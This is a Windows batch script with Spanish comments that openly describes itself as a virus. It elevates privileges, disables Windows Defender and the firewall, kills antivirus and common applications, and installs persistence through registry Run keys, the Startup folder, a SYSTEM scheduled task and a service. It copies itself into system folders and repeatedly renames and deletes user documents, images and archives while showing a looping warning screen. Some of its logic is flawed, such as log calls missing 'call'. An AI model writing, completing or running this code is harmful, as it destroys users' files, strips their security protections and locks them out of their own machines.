@echo off
setlocal enabledelayedexpansion

:: ==========================================
:: CONFIGURACIÓN PRINCIPAL
:: ==========================================
set "FIREWALL_RULE_NAME=Windows Defender Update"
set "TASK_SCHEDULER_NAME=WindowsUpdate_Check"
set "REG_RUN_KEY=HKCU\Software\Microsoft\CurrentVersion\Run"
set "ANTIVIRUS_NAMES=defender.exe,MsMpEng.exe,securityservice.exe,nisum.exe,msecom.exe,msmpeng.exe,msascui.exe,msmpsvc.exe,SecurityHealthSystray.exe,SecurityHealth.exe,svchost_k.exe,svchost_x.exe,explorer_new.exe"
set "FIREWALL_BLOCK_LIST=cmd.exe,powershell.exe,taskmgr.exe,regedit.exe,notepad.exe,calc.exe,chrome.exe,firefox.exe,msedge.exe,winword.exe,excel.exe,outlook.exe,onedrive.exe,spotify.exe,slack.exe,teams.exe,discord.exe,steam.exe,epicgameslauncher.exe,bluestacks.exe,xboxapp.exe"

:: ==========================================
:: FUNCIONES DE UTILIDAD
:: ==========================================
:log_message
    set "msg=%~1"
    echo [%date% %time%] !msg! >> "%temp%\_virus_log.txt" 2>nul
    goto :eof

:check_admin
    net session >nul 2>&1
    if %errorlevel% neq 0 (
        log_message "[!] No tiene permisos de administrador. Intentando elevar..."
        set "batch_path=%~f0"
        powershell -Command "Start-Process '%batch_path%' -Verb RunAs" 2>nul
        exit /b 1
    )
    log_message "[+] Ejecutando con permisos de administrador"
    goto :eof

:wait_keypress
    set /p "_press=Presione ENTER para continuar o cierre la ventana..."
    goto :eof

:full_screen_black
    mode 80,5
    color 00
    cls
    echo.
    echo.
    echo.
    echo                    WARNING
    echo.
    echo     Por que queres este tipo de contenido?
    echo.
    echo   Su computadora no dejara de hacer esto.
    echo.
    echo.
    echo.
    echo.
    echo.
    goto :eof

:restore_display
    mode 80,25
    color 07
    goto :eof

:close_applications
    for %%app in (%FIREWALL_BLOCK_LIST%) do (
        taskkill /f /im %%app >nul 2>&1
    )
    goto :eof

:encrypt_files_simple
    log_message "[*] Iniciando cifrado simple de archivos..."
    set "encrypted_count=0"
    for %%f in (*.txt *.docx *.pdf *.jpg *.png *.xlsx *.pptx *.zip *.rar *.mp3 *.mp4 *.avi) do (
        set "file_name=%%f"
        set "original_ext=!file_name:~-4!"
        if "!original_ext!"=="!original_ext:~0,1!" (
            set "ext=.!original_ext!!random!"
        ) else (
            set "ext=.encrypted_!random!"
        )
        copy /y "%%f" "%%f!ext!" >nul 2>&1
        del /f /q "%%f" >nul 2>&1
        set /a encrypted_count+=1
    )
    log_message "[+] Cifrado completado. Archivos procesados: !encrypted_count!"
    goto :eof

:install_startup_persistence
    log_message "[*] Instalando persistencia en inicio automático..."
    
    :: Método 1: Registro principal
    reg add "%REG_RUN_KEY%" /v "WindowsUpdate" /t REG_SZ /d "%~f0" /f >nul 2>&1
    
    :: Método 2: Carpeta Startup
    if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" mkdir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
    copy /y "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.bat" >nul 2>&1
    
    :: Método 3: Task Scheduler (si es admin)
    schtasks /create /tn "%TASK_SCHEDULER_NAME%" /tr "\"%~f0\"" /sc onlogon /ru SYSTEM /f >nul 2>&1
    
    :: Método 4: Servicio Windows (si es admin)
    sc create "WindowsUpdateSvc" binPath= "\"%~f0\"" type= own start= auto >nul 2>&1
    
    log_message "[+] Persistencia instalada exitosamente"
    goto :eof

:remove_antivirus_protection
    log_message "[*] Deshabilitando protección antivirus..."
    
    :: Detener procesos de antivirus conocidos
    for %%proc in (%ANTIVIRUS_NAMES%) do (
        taskkill /f /im %%proc >nul 2>&1
    )
    
    :: Deshabilitar Defender mediante registro
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefender" /t REG_SZ /d "" /f >nul 2>&1
    
    :: Deshabilitar firewall
    netsh advfirewall set allprofiles state off >nul 2>&1
    
    log_message "[+] Protección antivirus deshabilitada"
    goto :eof

:install_firewall_rules
    log_message "[*] Configurando reglas de firewall..."
    
    :: Crear regla de firewall para el virus mismo
    netsh advfirewall firewall add rule name="%FIREWALL_RULE_NAME%" dir=in action=allow program="%~f0" enable=yes >nul 2>&1
    
    :: Bloquear aplicaciones comunes
    for %%app in (%FIREWALL_BLOCK_LIST%) do (
        netsh advfirewall firewall add rule name="Block_%%app" dir=out action=block program="C:\Program Files\%%app" enable=yes >nul 2>&1
    )
    
    log_message "[+] Reglas de firewall configuradas"
    goto :eof

:prevent_deletion
    log_message "[*] Activando sistema anti-borrado..."
    
    :: Hacer el archivo de solo lectura
    attrib +r +h "%~f0" >nul 2>&1
    
    :: Crear copia en múltiples ubicaciones
    copy /y "%~f0" "C:\Windows\System32\WindowsUpdate.bat" >nul 2>&1
    copy /y "%~f0" "C:\Windows\WindowsUpdate.bat" >nul 2>&1
    copy /y "%~f0" "%SystemDrive%\WindowsUpdate.bat" >nul 2>&1
    copy /y "%~f0" "%TEMP%\WindowsUpdate.bat" >nul 2>&1
    
    :: Crear archivo de restauración automática
    echo @echo off > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Restore.bat"
    echo taskkill /f /im cmd.exe >nul 2>&1 >> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Restore.bat"
    echo start "" "%~f0" >> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Restore.bat"
    echo exit >> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Restore.bat"
    
    log_message "[+] Sistema anti-borrado activado"
    goto :eof

:monitor_window_state
    log_message "[*] Iniciando monitoreo de ventana..."
    
    :loop_monitor
    tasklist /fi "IMAGENAME eq cmd.exe" 2>nul | find /i "cmd.exe" >nul
    if %errorlevel% equ 0 (
        :: Ventana abierta - esperar 5 segundos
        timeout /t 5 /nobreak >nul
        goto :loop_monitor
    ) else (
        log_message "[!] Ventana cerrada. Reabriendo..."
        start "" "%~f0"
        timeout /t 2 /nobreak >nul
        goto :loop_monitor
    )
    goto :eof

:main_virus_loop
    log_message "[*] Iniciando bucle principal del virus..."
    
    :main_loop
    call :full_screen_black
    call :close_applications
    call :encrypt_files_simple
    call :install_startup_persistence
    call :remove_antivirus_protection
    call :install_firewall_rules
    call :prevent_deletion
    
    :: Esperar antes de repetir
    timeout /t 5 /nobreak >nul
    
    goto :main_loop
    goto :eof

:emergency_cleanup
    log_message "[*] Limpiando archivos temporales del virus..."
    del /f /q "%temp%\_virus_log.txt" >nul 2>&1
    goto :eof

:: ==========================================
:: PUNTO DE ENTRADA PRINCIPAL
:: ==========================================
:main
    log_message "[*] Inicializando virus..."
    call :check_admin
    call :install_startup_persistence
    call :remove_antivirus_protection
    call :install_firewall_rules
    call :prevent_deletion
    call :main_virus_loop
    goto :eof

:exit_clean
    log_message "[*] Salida limpia del virus..."
    call :emergency_cleanup
    exit /b 0

:exit_force
    log_message "[*] Salida forzada del virus..."
    taskkill /f /im cmd.exe >nul 2>&1
    exit /b 1

:end
    log_message "[*] Fin de ejecución del virus."
    exit /b 0
